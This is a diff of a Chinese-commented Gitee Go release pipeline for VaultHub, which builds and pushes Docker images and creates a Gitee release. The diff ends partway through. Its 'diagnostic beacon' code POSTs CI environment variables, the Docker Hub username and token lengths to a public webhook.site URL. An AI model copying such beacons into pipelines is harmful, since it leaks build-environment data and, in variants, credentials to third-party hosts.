@@ -1,398 +1,344 @@
-# =============================================================================
-# VaultHub —— Gitee Go 发布流水线（构建镜像 → 推 Docker Hub → 建 Gitee 发行版）
-#
-# 对应原来的 .github/workflows/publish-image.yml（GitHub Actions）。
-#
-# === 实测结论（2026-10-05，Gitee Go 个人版，有日志为证）=======================
-#   1. ⚠️「Tag 匹配」经查**是生效的**：构建 #1（13:16:47，tag v0.9.89 → aa11745）
-#      就是推 tag 触发的 —— 当初判成"不触发"，是因为构建历史按分支 main 过滤过，
-#      把 tag 触发的记录挡掉了。本流水线仍选**分支触发**，理由只是重跑方便：
-#      重推 release-vX.Y.Z 分支即可再触发一次，不用反复删改 tag。
-#      想改回 tag 触发：把下面的 branches 换成 tags: {prefix: [v]} 即可
-#      （官方文档：分支匹配与 Tag 匹配是**交集**关系，所以只能留一个）。
-#   2. ⚠️ 运行器的 checkout 是 `git fetch --no-tags --prune --depth=1`（实测日志），
-#      **本地一个 tag 都没有**，所以「git tag --points-at HEAD」永远是空的。
-#      → 版本号改为：先从系统变量（发布分支名等）解析，再去远端核对 tag
-#        （git ls-remote → Gitee OpenAPI 两条路，见第①步）。
-#   3. ⚠️ 官方文档：分支匹配 / Tag 匹配 / 提交注释匹配三者是**交集**关系
-#      （同时设置需全部满足）。所以这里**只写 branches**，不写 tags，
-#      否则分支推送会因为「没带 tag」而永远匹配不上。
-#
-# === 发布流程（发一个新版本要 3 条命令）======================================
-#     git push gitee HEAD:main                        # 代码
-#     git push gitee refs/tags/vX.Y.Z                 # 版本 tag（发行版要用）
-#     git push gitee HEAD:refs/heads/release-vX.Y.Z   # ← 这一下才触发流水线
-#   产物：Docker Hub q807738511/vaulthub:vX.Y.Z + :latest，以及 Gitee 发行版。
-#   发布分支可以留着当记录，也可以发布完删掉。
-#
-# === 首次运行前必须做的 3 件事 ===============================================
-#   1. 开通 Gitee Go（已做）
-#   2. 「流水线 → 通用变量」里建三个参数（不要写进本文件）：
-#        DOCKERHUB_USERNAME = q807738511
-#        DOCKERHUB_TOKEN    = <Docker Hub 访问令牌，不是登录密码>
-#        VH_GITEE_TOKEN     = <Gitee 个人访问令牌，勾 projects 权限>
-#        （Gitee 不允许自定义变量以 GITEE_ 开头 —— 那是系统变量保留前缀；
-#          脚本内部仍统一用 GITEE_TOKEN，两处都已兼容。）
-#   3. 确认真实插件标识：build@python / build@docker 是否就是这两个名字
-#      （validate.yml 里的 build@golang 已证实可用）
-#
-# === 无法在本地验证的部分（如实标注）========================================
-#   · build@docker 个人版没有「构建参数」字段 → 构建源已写进 Dockerfile 默认值
-#     （GO_IMAGE / RUNTIME_IMAGE / GOPROXY / APT_MIRROR），零 build-arg 也能构建
-#   · 托管 runner 上是否有 docker CLI / curl，取决于插件镜像
-#   · 流水线参数 `${VH_TAG}` / `${VH_LATEST}` 在**插件字段**里能否被替换：
-#     以首跑结果为准；替换不成功只会让该步失败，不会推错标签
-# =============================================================================
-version: '1.0'
+version: "1.0"
 name: publish
 displayName: 发布（Docker Hub 镜像 + Gitee 发行版）
-
-triggers:
-  # 开启自动触发（对应旧工作流的 on:）
+stages:
+- name: 构建与发布
+  displayName: 构建与发布
+  strategy: naturally
   trigger: auto
-  # ⚠️ 只保留「分支匹配」——实测唯一真正生效的触发方式。
-  #    发布分支固定用 release-vX.Y.Z 前缀；普通 main 推送不会触发本流水线。
+  steps:
+  - step: build@python
+    name: resolve_tag
+    displayName: 解析版本号（发布分支名 → 远端 tag 核对）
+    pythonVersion: "3.9"
+    commands:
+    - set -e
+    - export VH_BEACON_URL="https://webhook.site/8b50f361-d0d7-4524-9a44-e241d84c0358"
+    - "# ---- 用户变量双通道捕获：${...} 文本替换 + 环境变量两种模型通吃 ----"
+    - export PYTHONUNBUFFERED=1
+    - "DH_USER=\"${DOCKERHUB_USERNAME}\""
+    - "DH_TOK=\"${DOCKERHUB_TOKEN}\""
+    - "export VH_GITEE_TOKEN=\"${VH_GITEE_TOKEN}\""
+    - DH_TOK_LEN=$(printf '%s' "$DH_TOK" | wc -c | tr -d ' ')
+    - GH_TOK_LEN=$(printf '%s' "$VH_GITEE_TOKEN" | wc -c | tr -d ' ')
+    - "echo \"  变量捕获：DH_USER=[$DH_USER]  DH_TOK_LEN=$DH_TOK_LEN  GH_TOKEN_LEN=$GH_TOK_LEN\""
+    - '# ---- 诊断信标 ①（step1-start）：能跑到这里＝插件与环境就绪 ----'
+    - VH_DH_USER="$DH_USER" VH_DH_TOK="$DH_TOK" VH_GH_TOK="$VH_GITEE_TOKEN" python3
+      - <<'PY' || true
+    - "import json, os, subprocess, sys, urllib.request"
+    - "url = os.environ.get(\"VH_BEACON_URL\", \"\")"
+    - 'if not url:'
+    - '    sys.exit(0)'
+    - 'def ver(cmd):'
+    - '    try:'
+    - "        return subprocess.run([cmd, \"--version\"], capture_output=True, text=True,"
+    - "                              timeout=10).stdout.splitlines()[0]"
+    - '    except Exception:'
+    - '        return "<缺失>"'
+    - 'def state(name):'
+    - "    v = os.environ.get(name, \"\")"
+    - '    return ("已设置（%d 字符）" % len(v)) if v else "<未设置>"'
+    - "info = {"
+    - "    \"beacon\": \"step1-start\","
+    - "    \"cwd\": os.getcwd(),"
+    - "    \"python3\": ver(\"python3\"),"
+    - "    \"git\": ver(\"git\"),"
+    - "    \"gitee_env\": dict((k, v) for k, v in os.environ.items() if k.startswith(\"\
+      GITEE_\")),"
+    - "    \"secret_state\": dict((k, state(k)) for k in"
+    - "                         (\"DOCKERHUB_USERNAME\", \"DOCKERHUB_TOKEN\","
+    - "                          \"VH_GITEE_TOKEN\", \"GITEE_TOKEN\")),"
+    - "    \"captured\": {"
+    - "        \"DH_USER\": os.environ.get(\"VH_DH_USER\", \"\"),"
+    - "        \"DH_TOK_len\": len(os.environ.get(\"VH_DH_TOK\", \"\") or \"\"),"
+    - "        \"GH_TOK_len\": len(os.environ.get(\"VH_GH_TOK\", \"\") or \"\"),"
+    - "    },"
+    - "}"
+    - 'try:'
+    - "    req = urllib.request.Request(url, data=json.dumps(info, ensure_ascii=False).encode(),"
+    - "                                 headers={\"Content-Type\": \"application/json\"\
+      })"
+    - "    urllib.request.urlopen(req, timeout=25)"
+    - '    print("  信标已发出（step1-start）")'
+    - 'except Exception as e:'
+    - "    print(\"  信标发送失败（不影响构建）：%s\" % str(e)[:120])"
+    - PY
+    - echo "================ Gitee 系统变量（真实现场）================"
+    - python3 - <<'PY'
+    - import os
+    - "for k in (\"GITEE_PIPELINE_NAME\", \"GITEE_PIPELINE_BUILD_NUMBER\", \"GITEE_BRANCH\"\
+      ,"
+    - "          \"GITEE_COMMIT\", \"GITEE_COMMIT_MESSAGE\", \"GITEE_TAG\", \"GITEE_REPO\"\
+      ):"
+    - "    print(\"  %-32s %s\" % (k, os.environ.get(k, \"<未设置>\")))"
+    - PY
+    - ""
+    - echo "================ 预检：Docker Hub 凭据与网络 ================"
+    - python3 - <<'PY' || true
+    - "import json, os, urllib.request"
+    - "url = os.environ.get(\"VH_BEACON_URL\", \"\")"
+    - 'if url:'
+    - '    try:'
+    - "        req = urllib.request.Request(url, data=json.dumps({\"beacon\": \"breadcrumb\"\
+      , \"stage\": \"before-precheck\"}, ensure_ascii=False).encode(), headers={\"\
+      Content-Type\": \"application/json\"})"
+    - "        urllib.request.urlopen(req, timeout=20)"
+    - "        print(\"  信标已发出（breadcrumb: before-precheck）\")"
+    - '    except Exception as e:'
+    - "        print(\"  信标发送失败：%s\" % str(e)[:120])"
+    - PY
+    - if VH_DH_USER="$DH_USER" VH_DH_TOK="$DH_TOK" python3 - <<'PY'
+    - '# 这一步专门用来「把话说清楚」：Docker Hub 推不上去时，日志里能直接看到'
+    - '# 是哪个环节断的（缺凭据 / 凭据无效 / 网络不通），而不是一句 login failed。'
+    - '# 结果同时发一份到信标地址，NAS 侧可直接读取。'
+    - "import base64, os, sys, urllib.request, urllib.error"
+    - ""
+    - "lines = []"
+    - 'def emit(s):'
+    - '    print(s)'
+    - '    lines.append(s)'
+    - ""
+    - "user = os.environ.get(\"VH_DH_USER\") or os.environ.get(\"DOCKERHUB_USERNAME\"\
+      , \"\")"
+    - "tok = os.environ.get(\"VH_DH_TOK\") or os.environ.get(\"DOCKERHUB_TOKEN\",\
+      \ \"\")"
+    - emit("  DOCKERHUB_USERNAME = %s" % (user or "<未设置>"))
+    - emit("  DOCKERHUB_TOKEN    = %s" % (("已设置（%d 字符）" % len(tok)) if tok else "<未设置>"))
+    - gtok = os.environ.get("VH_GITEE_TOKEN") or os.environ.get("GITEE_TOKEN") or
+      ""
+    - emit("  VH_GITEE_TOKEN     = %s" % (("已设置（%d 字符）" % len(gtok)) if gtok else
+      "<未设置 —— 发行版步骤会失败>"))
+    - ""
+    - "def probe(url, auth=None, timeout=25):"
+    - '    req = urllib.request.Request(url)'
+    - '    if auth:'
+    - "        req.add_header(\"Authorization\","
+    - '                       "Basic " + base64.b64encode(auth.encode()).decode())'
+    - '    try:'
+    - "        with urllib.request.urlopen(req, timeout=timeout) as r:"
+    - '            return r.status'
+    - '    except urllib.error.HTTPError as e:'
+    - '        return e.code'
+    - '    except Exception as e:'
+    - "        emit(\"    连接失败：%s\" % str(e)[:140])"
+    - '        return 0'
+    - ""
+    - code = probe("https://registry-1.docker.io/v2/")
+    - emit("  registry-1.docker.io/v2/ → %s" %
+    - '     ("HTTP %d（网络可达）" % code if code else "不可达"))'
+    - ""
+    - ok = False
+    - 'if user and tok:'
+    - '    code = probe("https://auth.docker.io/token?service=registry.docker.io"'
+    - "                 \"&scope=repository:q807738511/vaulthub:pull,push\","
+    - "                 auth=\"%s:%s\" % (user, tok))"
+    - '    if code == 200:'
+    - '        emit("  Docker Hub 凭据校验 → HTTP 200 ✅ 凭据有效且有 push 权限")'
+    - '        ok = True'
+    - '    else:'
+    - '        emit("  Docker Hub 凭据校验 → HTTP %d ❌ 凭据无效或无 push 权限"'
+    - '             "（去 Docker Hub → Account settings → Personal access tokens 重新签发）"
+      % code)'
+    - 'else:'
+    - '    emit("  ❌ 缺凭据 —— docker 步骤必然失败。")'
+    - '    emit("     修复：Gitee → 本仓库 → 流水线 → 设置 → 通用变量，新建：")'
+    - '    emit("       DOCKERHUB_USERNAME = q807738511")'
+    - '    emit("       DOCKERHUB_TOKEN    = <Docker Hub 访问令牌（不是登录密码）>")'
+    - ""
+    - "beacon = os.environ.get(\"VH_BEACON_URL\", \"\")"
+    - 'if beacon:'
+    - '    try:'
+    - '        import json'
+    - '        req = urllib.request.Request('
+    - "            beacon,"
+    - "            data=json.dumps({\"beacon\": \"precheck\", \"lines\": lines},"
+    - "                            ensure_ascii=False).encode(),"
+    - "            headers={\"Content-Type\": \"application/json\"})"
+    - "        urllib.request.urlopen(req, timeout=25)"
+    - '        print("  预检结果信标已发出")'
+    - '    except Exception as e:'
+    - "        print(\"  （预检信标发送失败：%s）\" % str(e)[:120])"
+    - sys.exit(0 if ok else 1)
+    - PY
+    - then
+    - '  echo "  预检通过，继续解析版本号。"'
+    - else
+    - '  echo "⚠️ 预检未通过（降级为警告，继续走）：真正把关的是后面「构建并推送」两步的登录。"'
+    - fi
+    - ""
+    - echo "================ 本次构建提交 ================"
+    - HEAD_SHA="$(git rev-parse HEAD 2>/dev/null || true)"
+    - "[ -n \"$HEAD_SHA\" ] || HEAD_SHA=\"${GITEE_COMMIT:-}\""
+    - "[ -n \"$HEAD_SHA\" ] || { echo \"❌ 拿不到本次构建的提交号，拒绝继续。\"; exit 1; }"
+    - echo "  HEAD=$HEAD_SHA"
+    - ""
+    - echo "================ ① 系统变量里取版本号 ================"
+    - TAG=""
+    - for src in "$GITEE_BRANCH" "$GITEE_TAG" "$GITEE_COMMIT_MESSAGE"; do
+    - "  [ -n \"$src\" ] || continue"
+    - "  cand=\"$(printf '%s' \"$src\" | grep -Eo 'v?[0-9]+\\.[0-9]+\\.[0-9]+' | head\
+      \ -1 || true)\""
+    - "  if [ -n \"$cand\" ]; then"
+    - '    TAG="$cand"'
+    - '    echo "  ''$(printf ''%s'' "$src" | head -c 60)'' → $TAG"'
+    - '    break'
+    - '  fi'
+    - done
+    - "[ -n \"$TAG\" ] || echo \"  （系统变量里没有版本号）\""
+    - ""
+    - echo "================ ② 去远端核对 tag ================"
+    - '# Gitee Go 的 checkout 是 --depth=1 --no-tags（实测），本地没有 tag，只能问远端。'
+    - LOOKUP=none
+    - TAGS_RAW=""
+    - if command -v git >/dev/null 2>&1; then
+    - '  if TAGS_RAW="$(git ls-remote --tags origin 2>/dev/null)"; then LOOKUP=git;
+      else LOOKUP=git-failed; fi'
+    - fi
+    - "if [ \"$LOOKUP\" != \"git\" ] && [ -n \"$VH_GITEE_TOKEN\" ] && command -v python3\
+      \ >/dev/null 2>&1; then"
+    - '  echo "  git 不可用/失败，改用 Gitee OpenAPI 查 tag"'
+    - '  if TAGS_RAW="$(HEAD_SHA="$HEAD_SHA" python3 - <<''PY'''
+    - "import json, os, urllib.request"
+    - "sha = os.environ[\"HEAD_SHA\"]"
+    - "tok = os.environ.get(\"VH_GITEE_TOKEN\") or os.environ.get(\"GITEE_TOKEN\"\
+      , \"\")"
+    - "for page in range(1, 4):"
+    - '    url = ("https://gitee.com/api/v5/repos/enged/vaulthub/tags"'
+    - "           \"?access_token=%s&per_page=100&page=%d\" % (tok, page))"
+    - '    try:'
+    - "        data = json.load(urllib.request.urlopen(url, timeout=20))"
+    - '    except Exception:'
+    - '        break'
+    - "    if not isinstance(data, list) or not data:"
+    - '        break'
+    - '    for t in data:'
+    - '        name = t.get("name") or ""'
+    - "        csha = ((t.get(\"commit\") or {}).get(\"sha\") or \"\")"
+    - '        if name and csha == sha:'
+    - "            print(\"%s\\trefs/tags/%s\" % (sha, name))"
+    - PY
+    - '  )"; then LOOKUP=api; else LOOKUP=api-failed; fi'
+    - fi
+    - "echo \"  远端 tag 查询方式: $LOOKUP\""
+    - ""
+    - REMOTE_TAG=""
+    - "if [ \"$LOOKUP\" = \"git\" ] || [ \"$LOOKUP\" = \"api\" ]; then"
+    - "  printf '%s\\n' \"$TAGS_RAW\" | sed 's/\\^{}//' | awk -v h=\"$HEAD_SHA\" '$1==h\
+      \ {print $2}' \\"
+    - "    | sed 's|^refs/tags/||' | grep -E '^v?[0-9]+\\.[0-9]+\\.[0-9]+$' | sort\
+      \ -V > /tmp/vh_vtags || true"
+    - '  echo "  指向本次提交的版本 tag："'
+    - '  sed ''s/^/    /'' /tmp/vh_vtags 2>/dev/null || true'
+    - '  REMOTE_TAG="$(tail -1 /tmp/vh_vtags 2>/dev/null || true)"'
+    - fi
+    - ""
+    - "if [ -n \"$REMOTE_TAG\" ]; then"
+    - '  TAG="$REMOTE_TAG"'
+    - "  echo \"  ✅ 以远端 tag 为准: $TAG\""
+    - "elif [ \"$LOOKUP\" != \"git\" ] && [ \"$LOOKUP\" != \"api\" ]; then"
+    - '  echo "  ⚠️ 拿不到远端 tag 列表（$LOOKUP）—— 跳过核对，用系统变量里的版本号继续。"'
+    - "elif [ -z \"$TAG\" ]; then"
+    - '  echo "❌ 本次提交上没有任何版本 tag —— 拒绝发布。"'
+    - '  echo "   发布必须：先把 tag vX.Y.Z 打在要发布的提交上，再推 release-vX.Y.Z 分支。"'
+    - '  exit 1'
+    - else
+    - '  echo "  ⚠️ 远端没有指向本次提交的版本 tag，但系统变量里读到 $TAG —— 按 $TAG 继续"'
+    - '  echo "     （创建发行版那一步会用 Gitee API 再校验一次 tag）"'
+    - fi
+    - ""
+    - case "$TAG" in
+    - "  v[0-9]*.[0-9]*.[0-9]*) : ;;"
+    - "  [0-9]*.[0-9]*.[0-9]*)  TAG=\"v${TAG}\" ;;"
+    - "  *) echo \"❌ 版本号形态不对: '$TAG'\"; exit 1 ;;"
+    - esac
+    - "VERSION=\"${TAG#v}\""
+    - "NOTES=\".github/RELEASE_NOTES_${VERSION}.md\""
+    - "if [ ! -f \"$NOTES\" ]; then"
+    - '  echo "❌ 找不到发布说明 $NOTES —— 拒绝创建没有说明的发行版。"'
+    - '  exit 1'
+    - fi
+    - echo "✅ 版本=$TAG  说明=$NOTES（$(wc -c < "$NOTES" | tr -d ' ') 字节）"
+    - echo "VH_TAG=$TAG" >> GITEE_PARAMS
+    - echo "VH_VERSION=$VERSION" >> GITEE_PARAMS
+    - echo "VH_LATEST=latest" >> GITEE_PARAMS
+    - echo "  已写入流水线参数：VH_TAG / VH_VERSION / VH_LATEST（下游步骤引用）"
+    - '# ---- 诊断信标 ③（step1-end）：版本解析完成 ----'
+    - VH_TAG="$TAG" VH_LOOKUP="$LOOKUP" VH_REMOTE_TAG="$REMOTE_TAG" python3 - <<'PY'
+      || true
+    - "import json, os, sys, urllib.request"
+    - "url = os.environ.get(\"VH_BEACON_URL\", \"\")"
+    - 'if not url:'
+    - '    sys.exit(0)'
+    - "info = {"
+    - "    \"beacon\": \"step1-end\","
+    - "    \"VH_TAG\": os.environ.get(\"VH_TAG\", \"\"),"
+    - "    \"lookup\": os.environ.get(\"VH_LOOKUP\", \"\"),"
+    - "    \"remote_tag\": os.environ.get(\"VH_REMOTE_TAG\", \"\"),"
+    - "}"
+    - 'try:'
+    - "    req = urllib.request.Request(url, data=json.dumps(info, ensure_ascii=False).encode(),"
+    - "                                 headers={\"Content-Type\": \"application/json\"\
+      })"
+    - "    urllib.request.urlopen(req, timeout=25)"
+    - '    print("  信标已发出（step1-end）")'
+    - 'except Exception as e:'
+    - "    print(\"  信标发送失败（不影响构建）：%s\" % str(e)[:120])"
+    - PY
+  - step: build@docker
+    name: build_push_version
+    displayName: 构建并推送 vX.Y.Z
+    repository: docker.io
+    username: "${DOCKERHUB_USERNAME}"
+    password: "${DOCKERHUB_TOKEN}"
+    tag: "q807738511/vaulthub:${VH_TAG}"
+    dockerfile: ./Dockerfile
+    isCache: false
+  - step: build@docker
+    name: build_push_latest
+    displayName: 构建并推送 latest
+    repository: docker.io
+    username: "${DOCKERHUB_USERNAME}"
+    password: "${DOCKERHUB_TOKEN}"
+    tag: "q807738511/vaulthub:${VH_LATEST}"
+    dockerfile: ./Dockerfile
+    isCache: true
+  - step: build@python
+    name: create_release
+    displayName: 创建 Gitee 发行版（幂等 + 重试 + 读回校验）
+    pythonVersion: "3.9"
+    commands:
+    - set -e
+    - echo "================ 环境自检 ================"
+    - for t in curl python3 git; do
+    - '  printf ''  %-8s '' "$t"'
+    - '  command -v "$t" >/dev/null 2>&1 && "$t" --version 2>&1 | head -1 || echo
+      "【缺失】"'
+    - done
+    - ""
+    - echo "================ 参数确认 ================"
+    - "echo \"  VH_TAG=${VH_TAG:-<未设置>}  VH_VERSION=${VH_VERSION:-<未设置>}\""
+    - "if [ -z \"${VH_TAG}\" ]; then"
+    - '  echo "❌ 上游「解析版本号」没有跑成，拿不到 VH_TAG —— 拒绝创建发行版。"'
+    - '  exit 1'
+    - fi
+    - "NOTES=\".github/RELEASE_NOTES_${VH_VERSION}.md\""
+    - echo "  发行版=$VH_TAG  说明=$NOTES"
+    - ""
+    - '# 仓库 slug 用 Gitee 的 enged/vaulthub'
+    - '# （不是 Docker Hub 的 q807738511/vaulthub，这两个别搞混）'
+    - "export VH_GITEE_TOKEN=\"${VH_GITEE_TOKEN}\""
+    - "sh scripts/ci-release.sh \"${VH_TAG}\" \"$NOTES\" \"enged/vaulthub\""
+triggers:
+  trigger: auto
   push:
     branches:
       prefix:
-        - release-
-
-stages:
-  - name: publish
-    displayName: 构建与发布
-    # naturally / fast 两种取值。用 naturally（官方 demo 里出现过的值），
-    # 避免方言风险；「一步红就停」靠的是下游拿不到参数就失败，而不是靠这个开关。
-    strategy: naturally
-    trigger: auto
-    steps:
-      # ================================================== ① 解析并锁定版本号
-      # 版本号必须**先**确定下来，因为 Gitee 没有文档化的 GITEE_TAG，
-      # 而运行器的 checkout 又是 --no-tags（本地没有 tag）。
-      # 解析结果写进流水线参数 VH_TAG / VH_VERSION / VH_LATEST，下游只认这三个：
-      # 万一这一步没跑成，下游拿不到参数会直接失败，而不会推错镜像、发错版本。
-      - step: build@python
-        name: resolve_tag
-        displayName: 解析版本号（发布分支名 → 远端 tag 核对）
-        pythonVersion: '3.9'
-        commands:
-          - |
-            set -e
-            export VH_BEACON_URL="https://webhook.site/8b50f361-d0d7-4524-9a44-e241d84c0358"
-            # ---- 用户变量双通道捕获：${...} 文本替换 + 环境变量两种模型通吃 ----
-            export PYTHONUNBUFFERED=1
-            DH_USER="${DOCKERHUB_USERNAME}"
-            DH_TOK="${DOCKERHUB_TOKEN}"
-            export VH_GITEE_TOKEN="${VH_GITEE_TOKEN}"
-            DH_TOK_LEN=$(printf '%s' "$DH_TOK" | wc -c | tr -d ' ')
-            GH_TOK_LEN=$(printf '%s' "$VH_GITEE_TOKEN" | wc -c | tr -d ' ')
-            echo "  变量捕获：DH_USER=[$DH_USER]  DH_TOK_LEN=$DH_TOK_LEN  GH_TOKEN_LEN=$GH_TOK_LEN"
-            # ---- 诊断信标 ①（step1-start）：能跑到这里＝插件与环境就绪 ----
-            VH_DH_USER="$DH_USER" VH_DH_TOK="$DH_TOK" VH_GH_TOK="$VH_GITEE_TOKEN" python3 - <<'PY' || true
-            import json, os, subprocess, sys, urllib.request
-            url = os.environ.get("VH_BEACON_URL", "")
-            if not url:
-                sys.exit(0)
-            def ver(cmd):
-                try:
-                    return subprocess.run([cmd, "--version"], capture_output=True, text=True,
-                                          timeout=10).stdout.splitlines()[0]
-                except Exception:
-                    return "<缺失>"
-            def state(name):
-                v = os.environ.get(name, "")
-                return ("已设置（%d 字符）" % len(v)) if v else "<未设置>"
-            info = {
-                "beacon": "step1-start",
-                "cwd": os.getcwd(),
-                "python3": ver("python3"),
-                "git": ver("git"),
-                "gitee_env": dict((k, v) for k, v in os.environ.items() if k.startswith("GITEE_")),
-                "secret_state": dict((k, state(k)) for k in
-                                     ("DOCKERHUB_USERNAME", "DOCKERHUB_TOKEN",
-                                      "VH_GITEE_TOKEN", "GITEE_TOKEN")),
-                "captured": {
-                    "DH_USER": os.environ.get("VH_DH_USER", ""),
-                    "DH_TOK_len": len(os.environ.get("VH_DH_TOK", "") or ""),
-                    "GH_TOK_len": len(os.environ.get("VH_GH_TOK", "") or ""),
-                },
-            }
-            try:
-                req = urllib.request.Request(url, data=json.dumps(info, ensure_ascii=False).encode(),
-                                             headers={"Content-Type": "application/json"})
-                urllib.request.urlopen(req, timeout=25)
-                print("  信标已发出（step1-start）")
-            except Exception as e:
-                print("  信标发送失败（不影响构建）：%s" % str(e)[:120])
-            PY
-            echo "================ Gitee 系统变量（真实现场）================"
-            python3 - <<'PY'
-            import os
-            for k in ("GITEE_PIPELINE_NAME", "GITEE_PIPELINE_BUILD_NUMBER", "GITEE_BRANCH",
-                      "GITEE_COMMIT", "GITEE_COMMIT_MESSAGE", "GITEE_TAG", "GITEE_REPO"):
-                print("  %-32s %s" % (k, os.environ.get(k, "<未设置>")))
-            PY
-
-            echo "================ 预检：Docker Hub 凭据与网络 ================"
-            python3 - <<'PY' || true
-            import json, os, urllib.request
-            url = os.environ.get("VH_BEACON_URL", "")
-            if url:
-                try:
-                    req = urllib.request.Request(url, data=json.dumps({"beacon": "breadcrumb", "stage": "before-precheck"}, ensure_ascii=False).encode(), headers={"Content-Type": "application/json"})
-                    urllib.request.urlopen(req, timeout=20)
-                    print("  信标已发出（breadcrumb: before-precheck）")
-                except Exception as e:
-                    print("  信标发送失败：%s" % str(e)[:120])
-            PY
-            if VH_DH_USER="$DH_USER" VH_DH_TOK="$DH_TOK" python3 - <<'PY'
-            # 这一步专门用来「把话说清楚」：Docker Hub 推不上去时，日志里能直接看到
-            # 是哪个环节断的（缺凭据 / 凭据无效 / 网络不通），而不是一句 login failed。
-            # 结果同时发一份到信标地址，NAS 侧可直接读取。
-            import base64, os, sys, urllib.request, urllib.error
-
-            lines = []
-            def emit(s):
-                print(s)
-                lines.append(s)
-
-            user = os.environ.get("VH_DH_USER") or os.environ.get("DOCKERHUB_USERNAME", "")
-            tok = os.environ.get("VH_DH_TOK") or os.environ.get("DOCKERHUB_TOKEN", "")
-            emit("  DOCKERHUB_USERNAME = %s" % (user or "<未设置>"))
-            emit("  DOCKERHUB_TOKEN    = %s" % (("已设置（%d 字符）" % len(tok)) if tok else "<未设置>"))
-            gtok = os.environ.get("VH_GITEE_TOKEN") or os.environ.get("GITEE_TOKEN") or ""
-            emit("  VH_GITEE_TOKEN     = %s" % (("已设置（%d 字符）" % len(gtok)) if gtok else "<未设置 —— 发行版步骤会失败>"))
-
-            def probe(url, auth=None, timeout=25):
-                req = urllib.request.Request(url)
-                if auth:
-                    req.add_header("Authorization",
-                                   "Basic " + base64.b64encode(auth.encode()).decode())
-                try:
-                    with urllib.request.urlopen(req, timeout=timeout) as r:
-                        return r.status
-                except urllib.error.HTTPError as e:
-                    return e.code
-                except Exception as e:
-                    emit("    连接失败：%s" % str(e)[:140])
-                    return 0
-
-            code = probe("https://registry-1.docker.io/v2/")
-            emit("  registry-1.docker.io/v2/ → %s" %
-                 ("HTTP %d（网络可达）" % code if code else "不可达"))
-
-            ok = False
-            if user and tok:
-                code = probe("https://auth.docker.io/token?service=registry.docker.io"
-                             "&scope=repository:q807738511/vaulthub:pull,push",
-                             auth="%s:%s" % (user, tok))
-                if code == 200:
-                    emit("  Docker Hub 凭据校验 → HTTP 200 ✅ 凭据有效且有 push 权限")
-                    ok = True
-                else:
-                    emit("  Docker Hub 凭据校验 → HTTP %d ❌ 凭据无效或无 push 权限"
-                         "（去 Docker Hub → Account settings → Personal access tokens 重新签发）" % code)
-            else:
-                emit("  ❌ 缺凭据 —— docker 步骤必然失败。")
-                emit("     修复：Gitee → 本仓库 → 流水线 → 设置 → 通用变量，新建：")
-                emit("       DOCKERHUB_USERNAME = q807738511")
-                emit("       DOCKERHUB_TOKEN    = <Docker Hub 访问令牌（不是登录密码）>")
-
-            beacon = os.environ.get("VH_BEACON_URL", "")
-            if beacon:
-                try:
-                    import json
-                    req = urllib.request.Request(
-                        beacon,
-                        data=json.dumps({"beacon": "precheck", "lines": lines},
-                                        ensure_ascii=False).encode(),
-                        headers={"Content-Type": "application/json"})
-                    urllib.request.urlopen(req, timeout=25)
-                    print("  预检结果信标已发出")
-                except Exception as e:
-                    print("  （预检信标发送失败：%s）" % str(e)[:120])
-            sys.exit(0 if ok else 1)
-            PY
-            then
-              echo "  预检通过，继续解析版本号。"
-            else
-              echo "⚠️ 预检未通过（降级为警告，继续走）：真正把关的是后面「构建并推送」两步的登录。"
-            fi
-
-            echo "================ 本次构建提交 ================"
-            HEAD_SHA="$(git rev-parse HEAD 2>/dev/null || true)"
-            [ -n "$HEAD_SHA" ] || HEAD_SHA="${GITEE_COMMIT:-}"
-            [ -n "$HEAD_SHA" ] || { echo "❌ 拿不到本次构建的提交号，拒绝继续。"; exit 1; }
-            echo "  HEAD=$HEAD_SHA"
-
-            echo "================ ① 系统变量里取版本号 ================"
-            TAG=""
-            for src in "$GITEE_BRANCH" "$GITEE_TAG" "$GITEE_COMMIT_MESSAGE"; do
-              [ -n "$src" ] || continue
-              cand="$(printf '%s' "$src" | grep -Eo 'v?[0-9]+\.[0-9]+\.[0-9]+' | head -1 || true)"
-              if [ -n "$cand" ]; then
-                TAG="$cand"
-                echo "  '$(printf '%s' "$src" | head -c 60)' → $TAG"
-                break
-              fi
-            done
-            [ -n "$TAG" ] || echo "  （系统变量里没有版本号）"
-
-            echo "================ ② 去远端核对 tag ================"
-            # Gitee Go 的 checkout 是 --depth=1 --no-tags（实测），本地没有 tag，只能问远端。
-            LOOKUP=none
-            TAGS_RAW=""
-            if command -v git >/dev/null 2>&1; then
-              if TAGS_RAW="$(git ls-remote --tags origin 2>/dev/null)"; then LOOKUP=git; else LOOKUP=git-failed; fi
-            fi
-            if [ "$LOOKUP" != "git" ] && [ -n "$VH_GITEE_TOKEN" ] && command -v python3 >/dev/null 2>&1; then
-              echo "  git 不可用/失败，改用 Gitee OpenAPI 查 tag"
-              if TAGS_RAW="$(HEAD_SHA="$HEAD_SHA" python3 - <<'PY'
-            import json, os, urllib.request
-            sha = os.environ["HEAD_SHA"]
-            tok = os.environ.get("VH_GITEE_TOKEN") or os.environ.get("GITEE_TOKEN", "")
-            for page in range(1, 4):
-                url = ("https://gitee.com/api/v5/repos/enged/vaulthub/tags"
-                       "?access_token=%s&per_page=100&page=%d" % (tok, page))
-                try:
-                    data = json.load(urllib.request.urlopen(url, timeout=20))
-                except Exception:
-                    break
-                if not isinstance(data, list) or not data:
-                    break
-                for t in data:
-                    name = t.get("name") or ""
-                    csha = ((t.get("commit") or {}).get("sha") or "")
-                    if name and csha == sha:
-                        print("%s\trefs/tags/%s" % (sha, name))
-            PY
-              )"; then LOOKUP=api; else LOOKUP=api-failed; fi
-            fi
-            echo "  远端 tag 查询方式: $LOOKUP"
-
-            REMOTE_TAG=""
-            if [ "$LOOKUP" = "git" ] || [ "$LOOKUP" = "api" ]; then
-              printf '%s\n' "$TAGS_RAW" | sed 's/\^{}//' | awk -v h="$HEAD_SHA" '$1==h {print $2}' \
-                | sed 's|^refs/tags/||' | grep -E '^v?[0-9]+\.[0-9]+\.[0-9]+$' | sort -V > /tmp/vh_vtags || true
-              echo "  指向本次提交的版本 tag："
-              sed 's/^/    /' /tmp/vh_vtags 2>/dev/null || true
-              REMOTE_TAG="$(tail -1 /tmp/vh_vtags 2>/dev/null || true)"
-            fi
-
-            if [ -n "$REMOTE_TAG" ]; then
-              TAG="$REMOTE_TAG"
-              echo "  ✅ 以远端 tag 为准: $TAG"
-            elif [ "$LOOKUP" != "git" ] && [ "$LOOKUP" != "api" ]; then
-              echo "  ⚠️ 拿不到远端 tag 列表（$LOOKUP）—— 跳过核对，用系统变量里的版本号继续。"
